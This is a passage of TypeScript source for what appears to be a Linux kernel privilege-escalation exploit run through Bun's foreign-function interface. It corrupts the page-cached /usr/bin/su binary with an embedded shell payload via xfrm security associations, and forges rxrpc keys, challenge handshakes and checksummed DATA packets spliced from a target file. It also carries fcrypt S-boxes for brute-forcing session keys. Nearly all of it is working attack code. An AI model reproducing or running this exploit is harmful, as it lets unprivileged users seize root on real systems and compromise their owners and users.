    const spi = (0xdeadbe10 + i) >>> 0;
    const seqhi =
      ((SHELL_ELF[i * 4 + 0] << 24) |
        (SHELL_ELF[i * 4 + 1] << 16) |
        (SHELL_ELF[i * 4 + 2] << 8) |
        SHELL_ELF[i * 4 + 3]) >>>
      0;
    if (addXfrmSa(spi, seqhi) < 0) {
      progress(`corruptSu: add_xfrm_sa #${i} FAILED`);
      return -1;
    }
  }
  progress(`corruptSu: ${count} SAs installed, triggering writes...`);

  for (let i = 0; i < count; i++) {
    const spi = (0xdeadbe10 + i) >>> 0;
    const off = PATCH_OFFSET + i * 4;
    if (doOneWrite(TARGET_PATH, off, spi) < 0) {
      progress(`corruptSu: doOneWrite #${i} @ 0x${off.toString(16)} FAILED`);
      return -1;
    }
    if (i % 16 === 15) progress(`corruptSu: write ${i + 1}/${count} done`);
  }
  progress(`corruptSu: wrote ${PAYLOAD_LEN} bytes to ${TARGET_PATH}`);
  return 0;
}

// ── su_lpe_main ───────────────────────────────────────────────────────────────

export function suLpeMain(argv: string[]): number {
  for (const a of argv) {
    if (a === "-v" || a === "--verbose") g_su_verbose = 1;
  }
  if (getEnv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;

  // Bun uses a multithreaded JS engine (JSC). fork() via FFI leaves the child
  // with dead GC/JIT threads and a broken heap — the first Bun runtime call
  // (e.g. process.stdout.write) triggers a JSC assertion → SIGILL (status 0x84).
  // Fix: run corruptSu() inline in the main process instead of forking.
  // The unshare(CLONE_NEWUSER|CLONE_NEWNET) will affect the current process,
  // which is acceptable for a standalone exploit.
  progress("suLpeMain: running corruptSu() inline (no fork — Bun JSC fork limitation)");
  const rc = corruptSu();
  if (rc !== 0) {
    progress(`suLpeMain: corruptSu FAILED rc=${rc}`);
    return 1;
  }

  progress("suLpeMain: verifying patch...");
  if (
    verifyByte(TARGET_PATH, ENTRY_OFFSET, 0x31) !== 0 ||
    verifyByte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) !== 0
  ) {
    progress("suLpeMain: post-write verify FAILED (target unchanged)");
    return 1;
  }
  progress(`suLpeMain: /usr/bin/su page-cache patched at entry 0x${ENTRY_OFFSET.toString(16)}`);
  return 0;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PART 3 — rxrpc key builder · AF_ALG pcbc(fcrypt) · csum_iv · cksum
// ═══════════════════════════════════════════════════════════════════════════════

// ── Mutable session key (brute-force fills this before each trigger) ──────────

export const SESSION_KEY = Buffer.from([
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
]);

// ── do_unshare_userns_netns (rxrpc path — identity uid/gid map) ───────────────

function writeFile(path: string, content: string): number {
  const fd = openFd(path, O_WRONLY, 0) as number;
  if (fd < 0) return -1;
  const b = Buffer.from(content, "ascii");
  const r = C.write(fd, ptr(b), BigInt(b.length)) as bigint;
  C.close(fd);
  return Number(r);
}

export function doUnshareUsernsNetns(): number {
  const realUid = C.getuid() as number;
  const realGid = C.getgid() as number;

  if ((C.unshare(CLONE_NEWUSER | CLONE_NEWNET) as number) < 0) {
    WARN(`unshare(NEWUSER|NEWNET): ${errStr()}`);
    return -1;
  }
  LOG(`unshare(USER|NET) OK, real uid=${realUid}`);

  writeFile("/proc/self/setgroups", "deny");
  if (writeFile("/proc/self/uid_map", `${realUid} ${realUid} 1`) < 0) {
    WARN(`uid_map: ${errStr()}`);
    return -1;
  }
  if (writeFile("/proc/self/gid_map", `${realGid} ${realGid} 1`) < 0) {
    WARN(`gid_map: ${errStr()}`);
    return -1;
  }
  LOG(
    `uid/gid identity-mapped ${realUid}/${realGid}; gained CAP_NET_RAW within netns`,
  );

  const s = C.socket(AF_INET, SOCK_DGRAM, 0) as number;
  if (s >= 0) {
    const ifr = Buffer.alloc(SIZEOF_IFREQ, 0);
    writeStr(ifr, 0, "lo");
    if ((C.ioctl(s, SIOCGIFFLAGS, ptr(ifr)) as number) === 0) {
      const flags = ifr.readInt16LE(IFNAMSIZ);
      ifr.writeInt16LE(flags | IFF_UP | IFF_RUNNING, IFNAMSIZ);
      if ((C.ioctl(s, SIOCSIFFLAGS, ptr(ifr)) as number) < 0)
        WARN(`SIOCSIFFLAGS lo: ${errStr()}`);
      else LOG("lo brought UP in new netns");
    }
    C.close(s);
  }
  return 0;
}

// ── build_rxrpc_v1_token ──────────────────────────────────────────────────────
//
// Wire layout (all multi-byte fields big-endian):
//   u32  flags=0
//   u32  cell_len=4
//   u8[4] "evil"
//   u32  ntoken=1
//   u32  toklen   ← filled at end
//   -- token start --
//   u32  sec_ix=2 (RXKAD)
//   u32  vice_id=0
//   u32  kvno=1
//   u8[8] session_key
//   u32  start_time
//   u32  end_time
//   u32  primary_flag=1
//   u32  ticket_len=8
//   u8[8] ticket (0xCC)
//   -- token end -- (toklen = 4+4+4+8+4+4+4+4+8 = 44)
//   total = 5×4 + 44 = 64 bytes

export function buildRxrpcV1Token(sessionKey: Buffer): Buffer {
  const out = Buffer.alloc(128, 0);
  let p = 0;

  const write32BE = (v: number) => {
    out.writeUInt32BE(v >>> 0, p);
    p += 4;
  };
  const writeBytes = (src: Buffer | Uint8Array, len: number) => {
    src.copy(out as unknown as Buffer, p, 0, len);
    p += len;
  };

  write32BE(0); // flags
  const cell = Buffer.from("evil", "ascii");
  write32BE(cell.length); // cell_len
  writeBytes(cell, 4); // "evil" (already 4-byte aligned, no pad)
  write32BE(1); // ntoken

  const tokLenOffset = p; // save position to backfill toklen
  write32BE(0); // placeholder
  const tokStart = p;

  write32BE(2); // sec_ix = RXKAD
  write32BE(0); // vice_id
  write32BE(1); // kvno
  writeBytes(sessionKey, 8); // session_key
  const now = Number(C.time(0) as bigint);
  write32BE(now); // start_time
  write32BE(now + 86400); // end_time
  write32BE(1); // primary_flag
  write32BE(8); // ticket_len
  out.fill(0xcc, p, p + 8);
  p += 8; // ticket

  const tokLen = p - tokStart;
  out.writeUInt32BE(tokLen, tokLenOffset); // backfill

  return out.subarray(0, p);
}

// ── key_add / add_rxrpc_key ───────────────────────────────────────────────────

function keyAdd(
  type: string,
  desc: string,
  payload: Buffer,
  ringid: number,
): bigint {
  const typeBuf = Buffer.from(type + "\0", "ascii");
  const descBuf = Buffer.from(desc + "\0", "ascii");
  return sysAddKey(
    SYS_ADD_KEY,
    typeBuf,
    descBuf,
    payload,
    BigInt(payload.length),
    ringid,
  );
}

export function addRxrpcKey(desc: string): bigint {
  const token = buildRxrpcV1Token(SESSION_KEY);
  return keyAdd("rxrpc", desc, token, KEY_SPEC_PROCESS_KEYRING);
}

export function keyctlInvalidate(key: bigint): void {
  sysKeyctlInval(SYS_KEYCTL, KEYCTL_INVALIDATE, key);
}

// ── Struct sizes for AF_ALG / msghdr ─────────────────────────────────────────

// sockaddr_alg: family(2)+type[14]+feat(4)+mask(4)+name[64] = 88
const SIZEOF_SOCKADDR_ALG = 88;
// msghdr (x86_64): name_ptr(8)+namelen(4)+pad(4)+iov_ptr(8)+iovlen(8)+
//                  ctrl_ptr(8)+ctrllen(8)+flags(4)+pad(4) = 56
const SIZEOF_MSGHDR = 56;
// cmsghdr: len(8)+level(4)+type(4) = 16  (size_t on 64-bit)
const SIZEOF_CMSGHDR = 16;

// CMSG_ALIGN on 64-bit aligns to sizeof(size_t)=8
function cmsgAlign(n: number): number {
  return (n + 7) & ~7;
}
function cmsgLen(dataLen: number): number {
  return SIZEOF_CMSGHDR + dataLen;
}
function cmsgSpace(dataLen: number): number {
  return cmsgAlign(cmsgLen(dataLen));
}

function buildMsghdr(
  nameBuf: Buffer | null,
  nameLen: number,
  iovBuf: Buffer,
  iovLen: number,
  ctrlBuf: Buffer | null,
  ctrlLen: number,
): Buffer {
  const msg = Buffer.alloc(SIZEOF_MSGHDR, 0);
  const dv = new DataView(msg.buffer, msg.byteOffset);
  if (nameBuf) dv.setBigUint64(0, BigInt(ptr(nameBuf)), true);
  msg.writeUInt32LE(nameLen, 8);
  dv.setBigUint64(16, BigInt(ptr(iovBuf)), true);
  dv.setBigUint64(24, BigInt(iovLen), true);
  if (ctrlBuf) dv.setBigUint64(32, BigInt(ptr(ctrlBuf)), true);
  dv.setBigUint64(40, BigInt(ctrlLen), true);
  return msg;
}

// ── alg_open_pcbc_fcrypt ──────────────────────────────────────────────────────

export function algOpenPcbcFcrypt(key: Buffer): number {
  const s = C.socket(AF_ALG, SOCK_SEQPACKET, 0) as number;
  if (s < 0) {
    WARN(`socket(AF_ALG): ${errStr()}`);
    return -1;
  }

  const sa = Buffer.alloc(SIZEOF_SOCKADDR_ALG, 0);
  sa.writeUInt16LE(AF_ALG, 0); // salg_family
  writeStr(sa, 2, "skcipher"); // salg_type[14]
  writeStr(sa, 24, "pcbc(fcrypt)"); // salg_name[64]

  if ((C.bind(s, ptr(sa), SIZEOF_SOCKADDR_ALG) as number) < 0) {
    WARN(`bind(AF_ALG pcbc(fcrypt)): ${errStr()}`);
    C.close(s);
    return -1;
  }
  if ((C.setsockopt(s, SOL_ALG, ALG_SET_KEY, ptr(key), 8) as number) < 0) {
    WARN(`ALG_SET_KEY: ${errStr()}`);
    C.close(s);
    return -1;
  }
  return s;
}

// ── alg_op ────────────────────────────────────────────────────────────────────
//
// Encrypt or decrypt `inBuf` with `iv` (8 bytes) using the AF_ALG fd `algS`.
// Returns output buffer on success, null on error.

export function algOp(
  algS: number,
  op: number, // ALG_OP_ENCRYPT / ALG_OP_DECRYPT
  iv: Buffer, // 8 bytes
  inBuf: Buffer,
): Buffer | null {
  const opFd = C.accept(algS, 0, 0) as number;
  if (opFd < 0) {
    WARN(`accept(AF_ALG): ${errStr()}`);
    return null;
  }

  // Build control message buffer:
  //   cmsg[0]: ALG_SET_OP  (int = op)
  //   cmsg[1]: ALG_SET_IV  (af_alg_iv: ivlen=8, iv[8])
  const ctrlLen = cmsgSpace(4) + cmsgSpace(4 + 8); // 24 + 32 = 56
  const cbuf = Buffer.alloc(ctrlLen, 0);
  const cdv = new DataView(cbuf.buffer, cbuf.byteOffset);

  // cmsg[0] at offset 0
  cdv.setBigUint64(0, BigInt(cmsgLen(4)), true); // cmsg_len
  cbuf.writeInt32LE(SOL_ALG, 8); // cmsg_level
  cbuf.writeInt32LE(ALG_SET_OP, 12); // cmsg_type
  cbuf.writeInt32LE(op, 16); // data: int op

  // cmsg[1] at offset 24
  const c1 = cmsgSpace(4); // = 24
  cdv.setBigUint64(c1 + 0, BigInt(cmsgLen(4 + 8)), true); // cmsg_len = 28
  cbuf.writeInt32LE(SOL_ALG, c1 + 8); // cmsg_level
  cbuf.writeInt32LE(ALG_SET_IV, c1 + 12); // cmsg_type
  // af_alg_iv at c1+16:  ivlen(4) + iv[8]
  cbuf.writeUInt32LE(8, c1 + 16); // ivlen = 8
  iv.copy(cbuf, c1 + 20); // iv bytes

  const iov = makeIovec(inBuf);
  const msgBuf = buildMsghdr(null, 0, iov, 1, cbuf, ctrlLen);

  if ((C.sendmsg(opFd, ptr(msgBuf), 0) as bigint) < 0n) {
    WARN(`AF_ALG sendmsg: ${errStr()}`);
    C.close(opFd);
    return null;
  }

  const out = Buffer.alloc(inBuf.length);
  const nRd = C.read(opFd, ptr(out), BigInt(out.length)) as bigint;
  C.close(opFd);

  if (nRd !== BigInt(inBuf.length)) {
    WARN(`AF_ALG read got ${nRd} want ${inBuf.length}: ${errStr()}`);
    return null;
  }
  return out;
}

// ── compute_csum_iv ───────────────────────────────────────────────────────────
//
// ref: rxkad_prime_packet_security
//   tmpbuf[0..3] = htonl(epoch, cid, 0, security_ix)  (16 B)
//   PCBC-encrypt(tmpbuf, IV=session_key) → out[16]
//   csum_iv = out[8..15]

export function computeCsumIv(
  epoch: number,
  cid: number,
  secIx: number,
  key: Buffer,
): Buffer | null {
  const s = algOpenPcbcFcrypt(key);
  if (s < 0) return null;

  const inBuf = Buffer.alloc(16, 0);
  inBuf.writeUInt32BE(epoch, 0);
  inBuf.writeUInt32BE(cid, 4);
  inBuf.writeUInt32BE(0, 8);
  inBuf.writeUInt32BE(secIx, 12);

  const out = algOp(s, ALG_OP_ENCRYPT, key, inBuf);
  C.close(s);
  if (!out) return null;

  return out.subarray(8, 16); // last 8 bytes
}

// ── compute_cksum ─────────────────────────────────────────────────────────────
//
// ref: rxkad_secure_packet @rxkad.c:342
//   x = (cid_low2 << 30) | (seq & 0x3fffffff)
//   buf[0]=htonl(call_id), buf[1]=htonl(x)   (8 B)
//   PCBC-encrypt(buf, IV=csum_iv) → enc[8]
//   y = ntohl(enc[1]); cksum = (y>>16)&0xffff; if zero → 1

export function computeCksum(
  cid: number,
  callId: number,
  seq: number,
  key: Buffer,
  csumIv: Buffer,
): number | null {
  const s = algOpenPcbcFcrypt(key);
  if (s < 0) return null;

  const x =
    (((cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT)) |
      (seq & 0x3fffffff)) >>>
    0;
  const inBuf = Buffer.alloc(8, 0);
  inBuf.writeUInt32BE(callId, 0);
  inBuf.writeUInt32BE(x, 4);

  const out = algOp(s, ALG_OP_ENCRYPT, csumIv, inBuf);
  C.close(s);
  if (!out) return null;

  const y = out.readUInt32BE(4); // ntohl(out[1])
  let v = (y >>> 16) & 0xffff;
  if (v === 0) v = 1;
  return v;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PART 4 — AF_RXRPC client · UDP fake-server · do_one_trigger
// ═══════════════════════════════════════════════════════════════════════════════

// ── Struct sizes ──────────────────────────────────────────────────────────────

// sockaddr_rxrpc: family(2)+service(2)+transport_type(2)+transport_len(2)+
//                union max = sockaddr_in6(28) → total 36
const SIZEOF_SOCKADDR_RXRPC = 36;
// rxrpc_wire_header (packed): 5×u32 + 4×u8 + 2×u16 = 28
const SIZEOF_RXRPC_WIRE_HEADER = 28;
// rxkad_challenge (packed): 4×u32 = 16
const SIZEOF_RXKAD_CHALLENGE = 16;
// pollfd: fd(4)+events(2)+revents(2) = 8
const SIZEOF_POLLFD = 8;

const EAGAIN = 11;
const EWOULDBLOCK = 11;

// ── sockaddr_rxrpc builder ────────────────────────────────────────────────────

function makeSockaddrRxrpc(service: number, port: number): Buffer {
  const srx = Buffer.alloc(SIZEOF_SOCKADDR_RXRPC, 0);
  srx.writeUInt16LE(AF_RXRPC, 0); // srx_family
  srx.writeUInt16LE(service, 2); // srx_service
  srx.writeUInt16LE(SOCK_DGRAM, 4); // transport_type
  srx.writeUInt16LE(SIZEOF_SOCKADDR_IN, 6); // transport_len
  // union.sin starts at offset 8
  srx.writeUInt16LE(AF_INET, 8); // sin_family
  srx.writeUInt16BE(port, 10); // sin_port  (BE)
  srx.writeUInt32LE(LOCALHOST, 12); // sin_addr  (network-order bytes as LE u32)
  return srx;
}

// ── rxrpc_wire_header builder / reader ───────────────────────────────────────

function buildRxrpcHdr(
  epoch: number,
  cid: number,
  callNumber: number,
  seq: number,
  serial: number,
  type: number,
  flags: number,
  secIdx: number,
  cksum: number,
  serviceId: number,
): Buffer {
  const h = Buffer.alloc(SIZEOF_RXRPC_WIRE_HEADER, 0);
  h.writeUInt32BE(epoch, 0);
  h.writeUInt32BE(cid, 4);
  h.writeUInt32BE(callNumber, 8);
  h.writeUInt32BE(seq, 12);
  h.writeUInt32BE(serial, 16);
  h[20] = type;
  h[21] = flags;
  h[22] = 0; // userStatus
  h[23] = secIdx; // securityIndex
  h.writeUInt16BE(cksum, 24);
  h.writeUInt16BE(serviceId, 26);
  return h;
}

function readRxrpcHdr(buf: Buffer): {
  epoch: number;
  cid: number;
  callNumber: number;
  seq: number;
  serial: number;
  type: number;
  flags: number;
  securityIndex: number;
  cksum: number;
  serviceId: number;
} {
  return {
    epoch: buf.readUInt32BE(0),
    cid: buf.readUInt32BE(4),
    callNumber: buf.readUInt32BE(8),
    seq: buf.readUInt32BE(12),
    serial: buf.readUInt32BE(16),
    type: buf[20],
    flags: buf[21],
    securityIndex: buf[23],
    cksum: buf.readUInt16BE(24),
    serviceId: buf.readUInt16BE(26),
  };
}

// ── setup_rxrpc_client ────────────────────────────────────────────────────────

function setupRxrpcClient(localPort: number, keyname: string): number {
  const fd = C.socket(AF_RXRPC, SOCK_DGRAM, PF_RXRPC) as number;
  if (fd < 0) {
    WARN(`socket(AF_RXRPC client): ${errStr()}`);
    return -1;
  }

  const kn = Buffer.from(keyname, "ascii");
  if (
    (C.setsockopt(
      fd,
      SOL_RXRPC,
      RXRPC_SECURITY_KEY,
      ptr(kn),
      kn.length,
    ) as number) < 0
  ) {
    WARN(`client SECURITY_KEY: ${errStr()}`);
    C.close(fd);
    return -1;
  }

  const minLvl = Buffer.alloc(4);
  minLvl.writeInt32LE(RXRPC_SECURITY_AUTH, 0);
  if (
    (C.setsockopt(
      fd,
      SOL_RXRPC,
      RXRPC_MIN_SECURITY_LEVEL,
      ptr(minLvl),
      4,
    ) as number) < 0
  ) {
    WARN(`client MIN_SECURITY_LEVEL: ${errStr()}`);
    C.close(fd);
    return -1;
  }

  const srx = makeSockaddrRxrpc(0, localPort);
  if ((C.bind(fd, ptr(srx), SIZEOF_SOCKADDR_RXRPC) as number) < 0) {
    WARN(`client bind :${localPort}: ${errStr()}`);
    C.close(fd);
    return -1;
  }
  LOG(`AF_RXRPC client bound :${localPort}`);
  return fd;
}

// ── rxrpc_client_initiate_call ────────────────────────────────────────────────

function rxrpcClientInitiateCall(
  cliFd: number,
  srvPort: number,
  serviceId: number,
  userCallId: bigint,
): number {
  const data = Buffer.from("PINGPING", "ascii");
  const srx = makeSockaddrRxrpc(serviceId, srvPort);

  // cmsg: RXRPC_USER_CALL_ID (unsigned long = 8 bytes)
  const ctrlLen = cmsgSpace(8); // 24
  const cbuf = Buffer.alloc(ctrlLen, 0);
  const cdv = new DataView(cbuf.buffer, cbuf.byteOffset);
  cdv.setBigUint64(0, BigInt(cmsgLen(8)), true); // cmsg_len = 24
  cbuf.writeInt32LE(SOL_RXRPC, 8); // cmsg_level
  cbuf.writeInt32LE(RXRPC_USER_CALL_ID, 12); // cmsg_type
  cdv.setBigUint64(16, userCallId, true); // data

  const iov = makeIovec(data);
  const msgBuf = buildMsghdr(srx, SIZEOF_SOCKADDR_RXRPC, iov, 1, cbuf, ctrlLen);

  // temporary non-blocking to avoid stall
  const fl = C.fcntl(cliFd, F_GETFL, 0) as number;
  C.fcntl(cliFd, F_SETFL, fl | O_NONBLOCK);

  const n = C.sendmsg(cliFd, ptr(msgBuf), 0) as bigint;
  C.fcntl(cliFd, F_SETFL, fl);

  if (n < 0n) {
    const e = getErrno();
    if (e === EAGAIN || e === EWOULDBLOCK) {
      LOG(
        "client sendmsg returned EAGAIN (expected; kernel will keep retrying handshake)",
      );
      return 0;
    }
    WARN(`client sendmsg: ${errStr(e)}`);
    return -1;
  }
  LOG(
    `client sendmsg ${n} B → :${srvPort} (handshake will follow asynchronously)`,
  );
  return 0;
}

// ── setup_udp_server ──────────────────────────────────────────────────────────

function setupUdpServer(port: number): number {
  const s = C.socket(AF_INET, SOCK_DGRAM, 0) as number;
  if (s < 0) {
    WARN(`socket(udp server): ${errStr()}`);
    return -1;
  }
  const sa = makeSockaddrIn(port, LOCALHOST);
  if ((C.bind(s, ptr(sa), SIZEOF_SOCKADDR_IN) as number) < 0) {
    WARN(`udp server bind :${port}: ${errStr()}`);
    C.close(s);
    return -1;
  }
  LOG(`plain UDP fake-server bound :${port}`);
  return s;
}

// ── udp_recv_to ───────────────────────────────────────────────────────────────

function udpRecvTo(
  s: number,
  buf: Buffer,
  fromBuf: Buffer | null,
  timeoutMs: number,
): bigint {
  const pfd = Buffer.alloc(SIZEOF_POLLFD, 0);
  pfd.writeInt32LE(s, 0);
  pfd.writeInt16LE(POLLIN, 4);
  if ((C.poll(ptr(pfd), 1, timeoutMs) as number) <= 0) return -1n;

  if (fromBuf) {
    const flBuf = Buffer.alloc(4);
    flBuf.writeUInt32LE(SIZEOF_SOCKADDR_IN, 0);
    return C.recvfrom(
      s,
      ptr(buf),
      BigInt(buf.length),
      0,
      ptr(fromBuf),
      ptr(flBuf),
    ) as bigint;
  }
  return C.recvfrom(s, ptr(buf), BigInt(buf.length), 0, 0, 0) as bigint;
}

// ── trigger_seq (global counter) ──────────────────────────────────────────────

let triggerSeq = 0;

// ── do_one_trigger ────────────────────────────────────────────────────────────

export function doOneTrigger(
  targetFd: number,
  spliceOff: number,
  spliceLen: number,
): number {
  const keyname = `evil${triggerSeq++}`;

  const key = addRxrpcKey(keyname);
  if (key < 0n) {
    if (triggerSeq < 5) WARN(`add_rxrpc_key(${keyname}): ${errStr()}`);
    return -1;
  }

  // use varying ports to avoid TIME_WAIT collisions
  const portS = 7777 + ((triggerSeq * 2) % 200);
  const portC = portS + 1;
  const svcId = 1234;

  const udpSrv = setupUdpServer(portS);
  if (udpSrv < 0) {
    if (triggerSeq < 5) WARN(`setup_udp_server(${portS}) failed`);
    keyctlInvalidate(key);
    return -1;
  }

  const rxskCli = setupRxrpcClient(portC, keyname);
  if (rxskCli < 0) {
    if (triggerSeq < 5) WARN(`setup_rxrpc_client(${portC}, ${keyname}) failed`);
    C.close(udpSrv);
    keyctlInvalidate(key);
    return -1;
  }

  if (rxrpcClientInitiateCall(rxskCli, portS, svcId, 0xdeadn) < 0) {
    if (triggerSeq < 5) WARN("rxrpc_client_initiate_call failed");
    C.close(rxskCli);
    C.close(udpSrv);
    keyctlInvalidate(key);
    return -1;
  }

  // wait for the kernel rxrpc DATA packet to arrive at our fake server
  const pkt = Buffer.alloc(2048, 0);
  const cliAddr = Buffer.alloc(SIZEOF_SOCKADDR_IN, 0);
  const n = udpRecvTo(udpSrv, pkt, cliAddr, 1500);
  if (n < BigInt(SIZEOF_RXRPC_WIRE_HEADER)) {
    if (triggerSeq < 5) WARN(`udp_recv_to: n=${n} errno=${errStr()}`);
    C.close(rxskCli);
    C.close(udpSrv);
    keyctlInvalidate(key);
    return -1;
  }

  const wh = readRxrpcHdr(pkt);
  const cliPort = pkt.readUInt16BE(10 - 16 + 16); // cliAddr.sin_port at offset 2
  const sinPort = cliAddr.readUInt16BE(2); // sin_port (BE)

  // ── Send CHALLENGE ────────────────────────────────────────────────────────
  {
    const ch = Buffer.alloc(
      SIZEOF_RXRPC_WIRE_HEADER + SIZEOF_RXKAD_CHALLENGE,
      0,
    );
    // wire header
    const hdr = buildRxrpcHdr(
      wh.epoch,
      wh.cid,
      0,
      0,
      0x10000, // serial
      RXRPC_PACKET_TYPE_CHALLENGE, // type
      0, // flags
      2, // securityIndex
      0, // cksum (not used in challenge)
      wh.serviceId,
    );
    hdr.copy(ch, 0);
    // rxkad_challenge body (starts at offset 28)
    ch.writeUInt32BE(2, 28); // version
    ch.writeUInt32BE(0xdeadbeef, 32); // nonce
    ch.writeUInt32BE(1, 36); // min_level
    // __padding = 0

    const toDst = makeSockaddrIn(sinPort, LOCALHOST);
    if (
      (C.sendto(
        udpSrv,
        ptr(ch),
        BigInt(ch.length),
        0,
        ptr(toDst),
        SIZEOF_SOCKADDR_IN,
      ) as bigint) < 0n
    ) {
      C.close(rxskCli);
      C.close(udpSrv);
      keyctlInvalidate(key);
      return -1;
    }
  }

  // ── Drain RESPONSE (best-effort, 4 attempts) ──────────────────────────────
  for (let i = 0; i < 4; i++) {
    const src = Buffer.alloc(SIZEOF_SOCKADDR_IN, 0);
    if (udpRecvTo(udpSrv, pkt, src, 500) < 0n) break;
  }

  // ── Compute csum_iv and cksum ─────────────────────────────────────────────
  const csumIv = computeCsumIv(wh.epoch, wh.cid, 2, SESSION_KEY);
  if (!csumIv) {
    C.close(rxskCli);
    C.close(udpSrv);
    keyctlInvalidate(key);
    return -1;
  }
  const cksumH = computeCksum(wh.cid, wh.callNumber, 1, SESSION_KEY, csumIv);
  if (cksumH === null) {
    C.close(rxskCli);
    C.close(udpSrv);
    keyctlInvalidate(key);
    return -1;
  }

  // ── Build malicious DATA header ───────────────────────────────────────────
  const mal = buildRxrpcHdr(
    wh.epoch,
    wh.cid,
    wh.callNumber,
    1, // seq
    0x42000, // serial
    RXRPC_PACKET_TYPE_DATA,
    RXRPC_LAST_PACKET,
    2, // securityIndex
    cksumH,
    wh.serviceId,
  );

  // connect udp_srv → client port so splice sends to the right destination
  const dst = makeSockaddrIn(sinPort, LOCALHOST);
  if ((C.connect(udpSrv, ptr(dst), SIZEOF_SOCKADDR_IN) as number) < 0) {
    C.close(rxskCli);
    C.close(udpSrv);
    keyctlInvalidate(key);
    return -1;
  }

  // ── pipe + vmsplice header + splice file → pipe → udp_srv ────────────────
  const pipeFds = Buffer.alloc(8, 0);
  if ((C.pipe(ptr(pipeFds)) as number) < 0) {
    C.close(rxskCli);
    C.close(udpSrv);
    keyctlInvalidate(key);
    return -1;
  }
  const p0 = pipeFds.readInt32LE(0);
  const p1 = pipeFds.readInt32LE(4);

  const fail = (): number => {
    C.close(p0);
    C.close(p1);
    C.close(rxskCli);
    C.close(udpSrv);
    keyctlInvalidate(key);
    return -1;
  };

  // vmsplice mal header into write-end of pipe
  const iovMal = makeIovec(mal, SIZEOF_RXRPC_WIRE_HEADER);
  if ((C.vmsplice(p1, ptr(iovMal), 1n, 0) as bigint) < 0n) return fail();

  // splice spliceLen bytes from targetFd at spliceOff → pipe
  const offBuf = Buffer.alloc(8);
  offBuf.writeBigInt64LE(BigInt(spliceOff));
  if (
    (C.splice(
      targetFd,
      ptr(offBuf),
      p1,
      0,
      BigInt(spliceLen),
      SPLICE_F_NONBLOCK,
    ) as bigint) < 0n
  )
    return fail();

  // splice pipe (header + payload) → udp_srv (connected socket)
  const totalSplice = BigInt(SIZEOF_RXRPC_WIRE_HEADER + spliceLen);
  if ((C.splice(p0, 0, udpSrv, 0, totalSplice, 0n) as bigint) < 0n)
    return fail();

  C.close(p0);
  C.close(p1);

  // ── recvmsg the malicious DATA into kernel's verify_packet path ───────────
  const fl = C.fcntl(rxskCli, F_GETFL, 0) as number;
  C.fcntl(rxskCli, F_SETFL, fl | O_NONBLOCK);

  for (let round = 0; round < 5; round++) {
    const rb = Buffer.alloc(2048, 0);
    const srxRx = Buffer.alloc(SIZEOF_SOCKADDR_RXRPC, 0);
    const ccb = Buffer.alloc(256, 0);
    const iovRx = makeIovec(rb);
    const mRx = buildMsghdr(srxRx, SIZEOF_SOCKADDR_RXRPC, iovRx, 1, ccb, 256);
    const r = C.recvmsg(rxskCli, ptr(mRx), 0) as bigint;
    if (r > 0n) break;
    const e = getErrno();
    if (e === EAGAIN || e === EWOULDBLOCK) C.usleep(20000);
    else break;
  }
  C.fcntl(rxskCli, F_SETFL, fl);

  C.close(rxskCli);
  C.close(udpSrv);
  keyctlInvalidate(key);
  return 0;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PART 5 — fcrypt userspace: S-boxes · setkey · decrypt · brute-force
// ═══════════════════════════════════════════════════════════════════════════════

// ── Raw S-boxes (from crypto/fcrypt.c) ───────────────────────────────────────

const FC_SBOX0_RAW = new Uint8Array([
  0xea, 0x7f, 0xb2, 0x64, 0x9d, 0xb0, 0xd9, 0x11, 0xcd, 0x86, 0x86, 0x91, 0x0a,
  0xb2, 0x93, 0x06, 0x0e, 0x06, 0xd2, 0x65, 0x73, 0xc5, 0x28, 0x60, 0xf2, 0x20,
  0xb5, 0x38, 0x7e, 0xda, 0x9f, 0xe3, 0xd2, 0xcf, 0xc4, 0x3c, 0x61, 0xff, 0x4a,
  0x4a, 0x35, 0xac, 0xaa, 0x5f, 0x2b, 0xbb, 0xbc, 0x53, 0x4e, 0x9d, 0x78, 0xa3,
  0xdc, 0x09, 0x32, 0x10, 0xc6, 0x6f, 0x66, 0xd6, 0xab, 0xa9, 0xaf, 0xfd, 0x3b,
  0x95, 0xe8, 0x34, 0x9a, 0x81, 0x72, 0x80, 0x9c, 0xf3, 0xec, 0xda, 0x9f, 0x26,
  0x76, 0x15, 0x3e, 0x55, 0x4d, 0xde, 0x84, 0xee, 0xad, 0xc7, 0xf1, 0x6b, 0x3d,
  0xd3, 0x04, 0x49, 0xaa, 0x24, 0x0b, 0x8a, 0x83, 0xba, 0xfa, 0x85, 0xa0, 0xa8,
  0xb1, 0xd4, 0x01, 0xd8, 0x70, 0x64, 0xf0, 0x51, 0xd2, 0xc3, 0xa7, 0x75, 0x8c,
  0xa5, 0x64, 0xef, 0x10, 0x4e, 0xb7, 0xc6, 0x61, 0x03, 0xeb, 0x44, 0x3d, 0xe5,
  0xb3, 0x5b, 0xae, 0xd5, 0xad, 0x1d, 0xfa, 0x5a, 0x1e, 0x33, 0xab, 0x93, 0xa2,
  0xb7, 0xe7, 0xa8, 0x45, 0xa4, 0xcd, 0x29, 0x63, 0x44, 0xb6, 0x69, 0x7e, 0x2e,
  0x62, 0x03, 0xc8, 0xe0, 0x17, 0xbb, 0xc7, 0xf3, 0x3f, 0x36, 0xba, 0x71, 0x8e,
  0x97, 0x65, 0x60, 0x69, 0xb6, 0xf6, 0xe6, 0x6e, 0xe0, 0x81, 0x59, 0xe8, 0xaf,
  0xdd, 0x95, 0x22, 0x99, 0xfd, 0x63, 0x19, 0x74, 0x61, 0xb1, 0xb6, 0x5b, 0xae,
  0x54, 0xb3, 0x70, 0xff, 0xc6, 0x3b, 0x3e, 0xc1, 0xd7, 0xe1, 0x0e, 0x76, 0xe5,
  0x36, 0x4f, 0x59, 0xc7, 0x08, 0x6e, 0x82, 0xa6, 0x93, 0xc4, 0xaa, 0x26, 0x49,
  0xe0, 0x21, 0x64, 0x07, 0x9f, 0x64, 0x81, 0x9c, 0xbf, 0xf9, 0xd1, 0x43, 0xf8,
  0xb6, 0xb9, 0xf1, 0x24, 0x75, 0x03, 0xe4, 0xb0, 0x99, 0x46, 0x3d, 0xf5, 0xd1,
  0x39, 0x72, 0x12, 0xf6, 0xba, 0x0c, 0x0d, 0x42, 0x2e,
]);
